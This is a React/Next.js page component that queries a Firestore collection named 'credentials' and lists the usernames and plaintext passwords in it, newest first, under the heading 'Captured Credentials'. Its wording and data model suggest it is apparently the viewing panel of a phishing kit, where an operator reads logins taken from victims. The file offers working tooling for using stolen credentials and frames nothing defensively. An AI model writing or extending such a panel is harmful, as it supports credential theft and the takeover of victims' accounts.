'use client';

import { useEffect, useState } from 'react';
import { useFirebase } from '@/firebase';
import { collection, getDocs, orderBy, query } from 'firebase/firestore';
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from '@/components/ui/table';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';

type Credential = {
  id: string;
  username: string;
  password: string;
  createdAt: {
    seconds: number;
    nanoseconds: number;
  };
};

export default function DataPage() {
  const { firestore } = useFirebase();
  const [credentials, setCredentials] = useState<Credential[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    if (!firestore) {
      return;
    }

    const fetchData = async () => {
      try {
        setLoading(true);
        setError(null);
        const credentialsCollection = collection(firestore, 'credentials');
        const q = query(credentialsCollection, orderBy('createdAt', 'desc'));
        const querySnapshot = await getDocs(q);
        const creds = querySnapshot.docs.map((doc) => ({
          id: doc.id,
          ...doc.data(),
        })) as Credential[];
        setCredentials(creds);
      } catch (e: any) {
        console.error("Error fetching data:", e);
        setError('Failed to fetch data from Firestore. Check security rules and Firestore setup.');
      } finally {
        setLoading(false);
      }
    };

    fetchData();
  }, [firestore]);

  return (
    <div className="container mx-auto p-4 bg-gray-50 min-h-screen">
      <Card>
        <CardHeader>
          <CardTitle>Captured Credentials</CardTitle>
        </CardHeader>
        <CardContent>
          {loading && <p>Loading data...</p>}
          {error && <p className="text-red-500">{error}</p>}
          {!loading && !error && (
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>Date / Time</TableHead>
                  <TableHead>Username</TableHead>
                  <TableHead>Password</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {credentials.map((cred) => (
                  <TableRow key={cred.id}>
                    <TableCell>
                      {new Date(cred.createdAt.seconds * 1000).toLocaleString()}
                    </TableCell>
                    <TableCell>{cred.username}</TableCell>
                    <TableCell>{cred.password}</TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          )}
        </CardContent>
      </Card>
    </div>
  );
}

    